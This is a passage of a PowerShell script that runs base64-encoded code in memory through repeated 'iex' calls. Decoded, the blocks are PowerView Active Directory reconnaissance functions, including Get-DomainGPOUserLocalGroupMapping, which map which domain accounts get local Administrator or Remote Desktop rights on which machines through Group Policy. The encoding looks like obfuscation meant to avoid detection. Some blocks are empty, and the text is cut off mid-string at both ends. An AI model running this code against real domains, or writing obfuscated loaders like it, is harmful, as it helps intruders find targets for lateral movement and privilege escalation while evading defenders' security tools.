uaXN0cmF0b3JzJykgewogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSAnUy0xLTUtMzItNTQ0JwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRHcm91cG5hbWUgLW1hdGNoICdSZW1vdGUgRGVza3RvcCcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwU0lEID0gJ1MtMS01LTMyLTU1NScKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkR3JvdXBuYW1lIC1tYXRjaCAnR3Vlc3RzJykgewogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSAnUy0xLTUtMzItNTQ2JwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSBDb252ZXJ0VG8tU0lEIC1PYmplY3ROYW1lICRHcm91cG5hbWUgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cFNJRCA9IENvbnZlcnRUby1TSUQgLU9iamVjdE5hbWUgJEdyb3VwbmFtZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJE1lbWJlcnMgPSAkXy5Qcm9wZXJ0aWVzLm1lbWJlcnMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBNZW1iZXIgfCBXaGVyZS1PYmplY3QgeyAkXy5hY3Rpb24gLW1hdGNoICdBREQnIH0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRfLnNpZCkgeyAkXy5zaWQgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgeyAkXy5uYW1lIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkTWVtYmVycykgewogICAgICAgICAgICAgICAgICAgIGlmICgkXy5maWx0ZXJzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRGaWx0ZXJzID0gJF8uZmlsdGVycy5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgQHsnVHlwZScgPSAkXy5Mb2NhbE5hbWU7J1ZhbHVlJyA9ICRfLm5hbWV9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRGaWx0ZXJzID0gJE51bGwKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRNZW1iZXJzIC1pc25vdCBbU3lzdGVtLkFycmF5XSkgeyAkTWVtYmVycyA9IEAoJE1lbWJlcnMpIH0KICAgICAgICAgICAgICAgICAgICAkR3JvdXBzWE1MID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRHcm91cHNYTUwgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPUGF0aCcgJFRhcmdldEdyb3Vwc1hNTFBhdGgKICAgICAgICAgICAgICAgICAgICAkR3JvdXBzWE1MIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0ZpbHRlcnMnICRGaWx0ZXJzCiAgICAgICAgICAgICAgICAgICAgJEdyb3Vwc1hNTCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE5hbWUnICRHcm91cE5hbWUKICAgICAgICAgICAgICAgICAgICAkR3JvdXBzWE1MIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwU0lEJyAkR3JvdXBTSUQKICAgICAgICAgICAgICAgICAgICAkR3JvdXBzWE1MIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwTWVtYmVyT2YnICROdWxsCiAgICAgICAgICAgICAgICAgICAgJEdyb3Vwc1hNTCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE1lbWJlcnMnICRNZW1iZXJzCiAgICAgICAgICAgICAgICAgICAgJEdyb3Vwc1hNTC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuR3JvdXBzWE1MJykKICAgICAgICAgICAgICAgICAgICAkR3JvdXBzWE1MCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgY2F0Y2ggewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LUdyb3Vwc1hNTF0gRXJyb3IgcGFyc2luZyAkVGFyZ2V0R3JvdXBzWE1MUGF0aCA6ICRfIgogICAgICAgIH0KICAgIH0KICAgIEVORCB7CiAgICAgICAgJE1hcHBlZFBhdGhzLktleXMgfCBGb3JFYWNoLU9iamVjdCB7IFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uIC1QYXRoICRfIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZyB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmcnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRJZGVudGl0eSwKICAgICAgICBbU3RyaW5nXQogICAgICAgIFtWYWxpZGF0ZVNldCgnQWRtaW5pc3RyYXRvcnMnLCAnUy0xLTUtMzItNTQ0JywgJ1JEUCcsICdSZW1vdGUgRGVza3RvcCBVc2VycycsICdTLTEtNS0zMi01NTUnKV0KICAgICAgICAkTG9jYWxHcm91cCA9ICdBZG1pbmlzdHJhdG9ycycsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgICRDb21tb25Bcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkQ29tbW9uQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRDb21tb25Bcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkQ29tbW9uQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRDb21tb25Bcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRDb21tb25Bcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJENvbW1vbkFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJENvbW1vbkFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgJFRhcmdldFNJRHMgPSBAKCkKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydJZGVudGl0eSddKSB7CiAgICAgICAgICAgICRUYXJnZXRTSURzICs9IEdldC1Eb21haW5PYmplY3QgQENvbW1vbkFyZ3VtZW50cyAtSWRlbnRpdHkgJElkZW50aXR5IHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kIG9iamVjdHNpZAogICAgICAgICAgICAkVGFyZ2V0T2JqZWN0U0lEID0gJFRhcmdldFNJRHMKICAgICAgICAgICAgaWYgKC1ub3QgJFRhcmdldFNJRHMpIHsKICAgICAgICAgICAgICAgIFRocm93ICJbR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZ10gVW5hYmxlIHRvIHJldHJpZXZlIFNJRCBmb3IgaWRlbnRpdHkgJyRJZGVudGl0eSciCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRUYXJnZXRTSURzID0gQCgnKicpCiAgICAgICAgfQogICAgICAgIGlmICgkTG9jYWxHcm91cCAtbWF0Y2ggJ1MtMS01JykgewogICAgICAgICAgICAkVGFyZ2V0TG9jYWxTSUQgPSAkTG9jYWxHcm91cAogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRMb2NhbEdyb3VwIC1tYXRjaCAnQWRtaW4nKSB7CiAgICAgICAgICAgICRUYXJnZXRMb2NhbFNJRCA9ICdTLTEtNS0zMi01NDQnCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkVGFyZ2V0TG9jYWxTSUQgPSAnUy0xLTUtMzItNTU1JwogICAgICAgIH0KICAgICAgICBpZiAoJFRhcmdldFNJRHNbMF0gLW5lICcqJykgewogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0U2lkIGluICRUYXJnZXRTaWRzKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZ10gRW51bWVyYXRpbmcgbmVzdGVkIGdyb3VwIG1lbWJlcnNoaXBzIGZvcjogJyRUYXJnZXRTaWQnIgogICAgICAgICAgICAgICAgJFRhcmdldFNJRHMgKz0gR2V0LURvbWFpbkdyb3VwIEBDb21tb25Bcmd1bWVudHMgLVByb3BlcnRpZXMgJ29iamVjdHNpZCcgLU1lbWJlcklkZW50aXR5ICRUYXJnZXRTaWQgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBvYmplY3RzaWQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZ10gVGFyZ2V0IGxvY2FsZ3JvdXAgU0lEOiAkVGFyZ2V0TG9jYWxTSUQiCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmddIEVmZmVjdGl2ZSB0YXJnZXQgZG9tYWluIFNJRHM6ICRUYXJnZXRTSURzIgogICAgICAgICRHUE9ncm91cHMgPSBHZXQtRG9tYWluR1BPTG9jYWxHcm91cCBAQ29tbW9uQXJndW1lbnRzIC1SZXNvbHZlTWVtYmVyc1RvU0lEcyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgJEdQT2dyb3VwID0gJF8KICAgICAgICAgICAgaWYgKCRHUE9ncm91cC5Hcm91cFNJRCAtbWF0Y2ggJFRhcmdldExvY2FsU0lEKSB7CiAgICAgICAgICAgICAgICAkR1BPZ3JvdXAuR3JvdXBNZW1iZXJzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCAoJFRhcmdldFNJRHNbMF0gLWVxICcqJykgLW9yICgkVGFyZ2V0U0lEcyAtQ29udGFpbnMgJF8pICkgewogICAgICAgICAgICAgICAgICAgICAgICAkR1BPZ3JvdXAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCAoJEdQT2dyb3VwLkdyb3VwTWVtYmVyT2YgLWNvbnRhaW5zICRUYXJnZXRMb2NhbFNJRCkgKSB7CiAgICAgICAgICAgICAgICBpZiAoICgkVGFyZ2V0U0lEc1swXSAtZXEgJyonKSAtb3IgKCRUYXJnZXRTSURzIC1Db250YWlucyAkR1BPZ3JvdXAuR3JvdXBTSUQpICkgewogICAgICAgICAgICAgICAgICAgICRHUE9ncm91cAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSB8IFNvcnQtT2JqZWN0IC1Qcm9wZXJ0eSBHUE9OYW1lIC1VbmlxdWUKICAgICAgICAkR1BPZ3JvdXBzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRHUE9uYW1lID0gJF8uR1BPRGlzcGxheU5hbWUKICAgICAgICAgICAgJEdQT2d1aWQgPSAkXy5HUE9OYW1lCiAgICAgICAgICAgICRHUE9QYXRoID0gJF8uR1BPUGF0aAogICAgICAgICAgICAkR1BPVHlwZSA9ICRfLkdQT1R5cGUKICAgICAgICAgICAgaWYgKCRfLkdyb3VwTWVtYmVycykgewogICAgICAgICAgICAgICAgJEdQT01lbWJlcnMgPSAkXy5Hcm91cE1lbWJlcnMKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRHUE9NZW1iZXJzID0gJF8uR3JvdXBTSUQKICAgICAgICAgICAgfQogICAgICAgICAgICAkRmlsdGVycyA9ICRfLkZpbHRlcnMKICAgICAgICAgICAgaWYgKCRUYXJnZXRTSURzWzBdIC1lcSAnKicpIHsKICAgICAgICAgICAgICAgICRUYXJnZXRPYmplY3RTSURzID0gJEdQT01lbWJlcnMKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRUYXJnZXRPYmplY3RTSURzID0gJFRhcmdldE9iamVjdFNJRAogICAgICAgICAgICB9CiAgICAgICAgICAgIEdldC1Eb21haW5PVSBAQ29tbW9uQXJndW1lbnRzIC1SYXcgLVByb3BlcnRpZXMgJ25hbWUsZGlzdGluZ3Vpc2hlZG5hbWUnIC1HUExpbmsgJEdQT0d1aWQgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBpZiAoJEZpbHRlcnMpIHsKICAgICAgICAgICAgICAgICAgICAkT1VDb21wdXRlcnMgPSBHZXQtRG9tYWluQ29tcHV0ZXIgQENvbW1vbkFyZ3VtZW50cyAtUHJvcGVydGllcyAnZG5zaG9zdG5hbWUsZGlzdGluZ3Vpc2hlZG5hbWUnIC1TZWFyY2hCYXNlICRfLlBhdGggfCBXaGVyZS1PYmplY3QgeyRfLmRpc3Rpbmd1aXNoZWRuYW1lIC1tYXRjaCAoJEZpbHRlcnMuVmFsdWUpfSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IGRuc2hvc3RuYW1lCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkT1VDb21wdXRlcnMgPSBHZXQtRG9tYWluQ29tcHV0ZXIgQENvbW1vbkFyZ3VtZW50cyAtUHJvcGVydGllcyAnZG5zaG9zdG5hbWUnIC1TZWFyY2hCYXNlICRfLlBhdGggfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBkbnNob3N0bmFtZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRPVUNvbXB1dGVycykgewogICAgICAgICAgICAgICAgICAgIGlmICgkT1VDb21wdXRlcnMgLWlzbm90IFtTeXN0ZW0uQXJyYXldKSB7JE9VQ29tcHV0ZXJzID0gQCgkT1VDb21wdXRlcnMpfQogICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRTaWQgaW4gJFRhcmdldE9iamVjdFNJRHMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE9iamVjdCA9IEdldC1Eb21haW5PYmplY3QgQENvbW1vbkFyZ3VtZW50cyAtSWRlbnRpdHkgJFRhcmdldFNpZCAtUHJvcGVydGllcyAnc2FtYWNjb3VudHR5cGUsc2FtYWNjb3VudG5hbWUsZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lkJwogICAgICAgICAgICAgICAgICAgICAgICAkSXNHcm91cCA9IEAoJzI2ODQzNTQ1NicsJzI2ODQzNTQ1NycsJzUzNjg3MDkxMicsJzUzNjg3MDkxMycpIC1jb250YWlucyAkT2JqZWN0LnNhbWFjY291bnR0eXBlCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdE5hbWUnICRPYmplY3Quc2FtYWNjb3VudG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdEROJyAkT2JqZWN0LmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3RTSUQnICRPYmplY3Qub2JqZWN0c2lkCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEb21haW4nICREb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzR3JvdXAnICRJc0dyb3VwCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9EaXNwbGF5TmFtZScgJEdQT25hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT0d1aWQnICRHUE9HdWlkCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9QYXRoJyAkR1BPUGF0aAogICAgICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPVHlwZScgJEdQT1R5cGUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbnRhaW5lck5hbWUnICRfLlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJE9VQ29tcHV0ZXJzCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZy5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuR1BPTG9jYWxHcm91cE1hcHBpbmcnKQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgR2V0LURvbWFpblNpdGUgQENvbW1vbkFyZ3VtZW50cyAtUHJvcGVydGllcyAnc2l0ZW9iamVjdGJsLGRpc3Rpbmd1aXNoZWRuYW1lJyAtR1BMaW5rICRHUE9HdWlkIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldFNpZCBpbiAkVGFyZ2V0T2JqZWN0U0lEcykgewogICAgICAgICAgICAgICAgICAgICRPYmplY3QgPSBHZXQtRG9tYWluT2JqZWN0IEBDb21tb25Bcmd1bWVudHMgLUlkZW50aXR5ICRUYXJnZXRTaWQgLVByb3BlcnRpZXMgJ3NhbWFjY291bnR0eXBlLHNhbWFjY291bnRuYW1lLGRpc3Rpbmd1aXNoZWRuYW1lLG9iamVjdHNpZCcKICAgICAgICAgICAgICAgICAgICAkSXNHcm91cCA9IEAoJzI2ODQzNTQ1NicsJzI2ODQzNTQ1NycsJzUzNjg3MDkxMicsJzUzNjg3MDkxMycpIC1jb250YWlucyAkT2JqZWN0LnNhbWFjY291bnR0eXBlCiAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3ROYW1lJyAkT2JqZWN0LnNhbWFjY291bnRuYW1lCiAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdEROJyAkT2JqZWN0LmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdFNJRCcgJE9iamVjdC5vYmplY3RzaWQKICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNHcm91cCcgJElzR3JvdXAKICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRG9tYWluJyAkRG9tYWluCiAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT0Rpc3BsYXlOYW1lJyAkR1BPbmFtZQogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9HdWlkJyAkR1BPR3VpZAogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9QYXRoJyAkR1BPUGF0aAogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9UeXBlJyAkR1BPVHlwZQogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb250YWluZXJOYW1lJyAkXy5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRfLnNpdGVvYmplY3RibAogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZy5QU09iamVjdC5UeXBlTmFtZXMuQWRkKCdQb3dlclZpZXcuR1BPTG9jYWxHcm91cE1hcHBpbmcnKQogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblBvbGljeURhdGEgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKFtIYXNodGFibGVdKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ1NvdXJjZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUG9saWN5ID0gJ0RvbWFpbicsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnR